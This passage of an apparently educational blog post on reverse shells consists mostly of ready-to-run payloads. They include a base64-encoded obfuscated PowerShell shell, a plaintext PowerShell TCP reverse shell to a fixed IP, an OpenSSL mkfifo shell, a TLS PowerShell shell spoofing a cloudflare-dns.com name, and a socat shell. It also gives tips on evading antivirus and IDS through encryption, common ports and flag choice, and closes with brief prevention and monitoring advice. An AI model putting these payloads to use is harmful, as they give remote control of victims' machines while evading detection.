KCR7c1RgUmlgTmd9ICsgKCJ7MX17Mn17MH0iIC1mJ0w+ICcsJ1MnLCdIRUwnKSk7JHtzdHJgRUFgbXdSaWBURVJ9LigiezF9ezB9Ii1mICd1c2gnLCdGbCcpLkludm9rZSgpfTsmKCJ7MH17MX17Mn0iIC1mJ1dyaXRlVG8nLCdTdCcsJ3JlYW0nKSAnJzt3aGlsZSgoJHtiWWBUZVNgUmVhZH0gPSAke1NzYExTYFRyRUFtfS4oInswfXsxfSIgLWYgJ1JlJywnYWQnKS5JbnZva2UoJHtiVWBGYEZlcn0sIDAsICR7QmBVRmZgRVJ9LiJsYEVOR3RoIikpIC1ndCAwKSB7JHtjT21gTWFuZH0gPSAoICRqNnl1Szo6IlVgVGY4IikuImdldHNgVFJgaW5HIigke2J1RmBGZVJ9LCAwLCAke0JgeXRgRVNyZWFEfSAtIDEpOyR7T2BVYFRQVVR9ID0gdHJ5IHsmKCJ7MH17MX17M317NH17NX17Mn0iIC1mJ0knLCdudm9rZScsJ29uJywnLUV4cHJlJywncycsJ3NpJykgJHtDb21gbUFgTmR9IDI+JjEgfCAmKCJ7MH17Mn17MX0iIC1mICdPdXQtU3RyJywnZycsJ2luJyl9IGNhdGNoIHske199IHwgJigiezF9ezB9ezJ9IiAtZiAndC1TdHJpJywnT3UnLCduZycpfSYoInswfXsyfXszfXsxfSIgLWYnV3InLCdUb1N0cmVhbScsJ2l0JywnZScpICgke291VGBwdXR9KX0ke3NgVFJlQWBNV1JgSVRFUn0uKCJ7MX17MH0iIC1mICdzZScsJ0NsbycpLkludm9rZSgp
```
{: .nolineno }


| Option      | Meaning                                                                                                                                                                                                          |
| ----------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `-NoP`      | Short for `-NoProfile`. Launches PowerShell without loading the user's profile scripts. This avoids custom configurations and speeds up execution.                                                               |
| `-W Hidden` | Sets the window style to `Hidden`, meaning the PowerShell window won't appear on screen. Useful for stealthy or background execution. (is known by AV's to be used for malicious activity so it may get flagged) |
| `-e`        | Short for `-EncodedCommand`. Tells PowerShell to execute a base64-encoded string as a command. This is often used to obfuscate or compress long commands.                                                        |

>**Options like**  
> `nop -exec bypass -win Hidden -noni -enc`
> `-ep bypass -noni -w hidden -enc`
>are known to get flagged by AV's and detection implementations.
{: .prompt-info }

For this example we used `TOKEN` obfuscation for a better explanation of the tool [The Invoke Obfuscation Usage guide](https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide)

---
### Issues with non-encrypted communication channels when using shells

>**Note**  
>When setting up a reverse shell, itâ€™s often safer to use ports that are already common and expected on the target system. This reduces the chance of being blocked by firewalls or intrusion detection systems, since the traffic blends in with normal communication. Examples include **22 (SSH)**, **443 (HTTPS)**, or **445 (SMB)**.

>Always confirm that the target is legitimately using the chosen port before attempting this, otherwise the connection may fail or raise suspicion.
{: .prompt-warning}

When you run a normal shell when executing commands they can be seen in the plaintext if you use tools like wireshark or tcpdump

**On target**

```powershell
PS C:\Users> powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('10.10.15.154', 6789);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
```
{: .nolineno }

**attacker**

```bash
user@pwnarchive:~$ socat -d -d TCP-LISTEN:6789 STDOUT
```
{: .nolineno }

![[Screenshot From 2025-09-24 08-53-28.png]]({{ "assets/img/images/posts/shells/pcap1.png" | relative_url }})

**If we follow the TCP stream**

![[Screenshot From 2025-09-24 08-54-11.png]]({{ "assets/img/images/posts/shells/pcap2.png" | relative_url }})


To prevent that we can create an encrypted connection which can help us in increasing our chances on evading detection and many detection systems (AV, EDR, IDS/IPS) rely on signatures or recognizable patterns. If the traffic is encrypted, those signatures are harder to match.  

### how do we create the encrypted communication?

#### OpenSSL reverse shell
this is one of the simplest ways to set up an encrypted reverse shell without installing additional tools, provided itâ€™s available on the target.

we can create a certificate to encrypt the communication using the Openssl command. and inmediatly set up the listener to be able to receive a connection back

```bash
user@pwnarchive:~$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 30 -nodes; openssl s_server -quiet -key key.pem -cert cert.pem -port 443
```
{: .nolineno }


We again use the same one line but this time we use Openssl client command to generate a shell and send the connection to port 443 to our machine.

```bash
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|openssl s_client -quiet -connect 10.0.0.7:443 >/tmp/f
```
{: .nolineno }

### Windows SSL TLS Reverse shell

##### Target

```powershell
$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('192.166.15.20', 6789);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()
```
{: .nolineno }

##### attacker

```bash
user@pwnarchive:~$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 30 -nodes; openssl s_server -quiet -key key.pem -cert cert.pem -port 6789
```
{: .nolineno }

---
### Socat

If the target has socat available on their machine this can be done even easier.

Attacker

```bash
user@pwnarchive:~$ socat OPENSSL-LISTEN:4443,cert=cert.pem,verify=0 -
```
{: .nolineno }

On target

```bash
$ socat EXEC:/bin/bash,pty,stderr,setsid,sigint,sane OPENSSL:attacker_ip:4443,verify=0
```
{: .nolineno }

---

We've seen the attacker side, now how do we defend against these techniques.

## Prevention

To reduce the risk of remote shell attacks a layered defense strategy is key

- **Patch Management** : Keep systems and applications updated with the latest security patches. 

- **Firewall Rules**: Apply strict firewall rules to block unauthorized outbound traffic while allowing only essential services (web, email, etc.). This prevents reverse shells from calling back to an attacker.

- **Endpoint Security**: Use endpoint protection such as antivirus and antiâ€‘malware to detect and block malicious payloads before they establish a shell.

- **User Education**: Training users to recognize phishing and social engineering attempts, which remain the most common delivery methods for reverse shell payloads.

## Monitoring

Detection is just as important as prevention. Watch for these:

- **Suspicious nonâ€‘admin user actions**: Commands like `whoami` or unusual SMB connections between end hosts can indicate compromise. Enable logging of shell usage, PowerShell activity, and user interactions for visibility.

- **Anomalous network sessions**: Monitor NetFlow or firewall logs for unusual traffic patterns, such as traffic on nonstandard ports (e.g., 4444), bulk HTTP requests, or unexpected remote logins. Tools like SIEMs and network monitors help identify these anomalies.

- **File uploads**: Malicious uploads are a common entry point for shells. Review application logs for suspicious files, and harden any internetâ€‘facing hosts. Adding deep packet inspection can also help.

---

## Potential Mitigations

To further limit exposure and impact:

- **Application Sandboxing**: Isolate exposed applications so that even if exploited, the attackerâ€™s reach is contained.

- **Least Privilege Policies**: Grant users only the permissions they need, reducing the impact of a compromise.

- **Host Segmentation & Hardening**: Harden boundary hosts and segment them from internal systems to prevent lateral movement.

- **Layered Firewalls**: Use both physical and applicationâ€‘layer firewalls with strict inbound/outbound rules. Denying unauthorized traffic and restricting ports can disrupt both bind and reverse shells.


---

### Useful tools and websites

- **Reverse Shell Templates**  
  A handy generator for reverse shell payloads 
  [revshells.com](https://www.revshells.com/)

- **Reverse Shell Cheatsheets**  
  A comprehensive collection of reverse shell one-liners and techniques:  
  [Internal All The Things | Reverse Shell Cheat Sheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)

- **Pwncat**  
  pwncat is a post-exploitation platform
  [pwncat](https://github.com/calebstewart/pwncat)
  
- **GTFObins (shell breakout bins section)**  
  A list of binaries which can be used to breakout of restrictive enviroments
  [GTFObin (shell breakout bins section)](https://gtfobins.github.io/#+shell)

- **Fully Interactive shell cheatsheet**  
  [InternalAllTheThings | Spawn a TTY shell](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#spawn-tty-shell)

### Great Articles

- **Encrypted Reverse Shell for Pentesters**  
  A detailed walkthrough on creating encrypted shells to avoid sending plaintext data.  
  [Hacking Articles](https://www.hackingarticles.in/encrypted-reverse-shell-for-pentester/)

- **Fully interactive shell windows**  
  Tricks on how to get a windows interactive shell.  
  [zekosec](https://zekosec.com/blog/interactive-windows-reverse-shell/)

- **0xffsec Restricted shells**
  Escape from restricted shells  
  [Restricted shells](https://0xffsec.com/handbook/shells/restricted-shells/)

- **Powershell Obfuscation**  
  Invoke-Obfuscation guide.  
  [The Invoke Obfuscation Usage guide](https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide)


